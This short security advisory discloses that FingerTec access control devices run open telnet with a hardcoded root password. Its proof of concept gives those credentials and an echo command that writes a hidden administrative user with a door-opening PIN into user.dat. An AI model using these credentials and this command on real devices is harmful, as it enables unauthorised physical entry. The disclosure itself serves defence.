1. Description

Almost all FingerTec Access Control devices are running with open telnet, with a hardcoded default root password. Additionally, it is trivial to enroll a new administrative user on the device with a pin code or RFID card that will allow opening the door.

2. Proof of Concept

Login to telnet with the credentials: root / founder88
At the console type in the command:
echo -n -e \\\\x39\\\\x5\\\\x6\\\\x31\\\\x32\\\\x33\\\\x34\\\\x35\\\\x48\\\\x61\\\\x78\\\\x78\\\\x30\\\\x72\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x1\\\\x0\\\\x0\\\\x39\\\\x5\\\\x0\\\\x0 >> user.dat
This will create a user named Haxx0r with an id of 1337 and a pin of 12345.
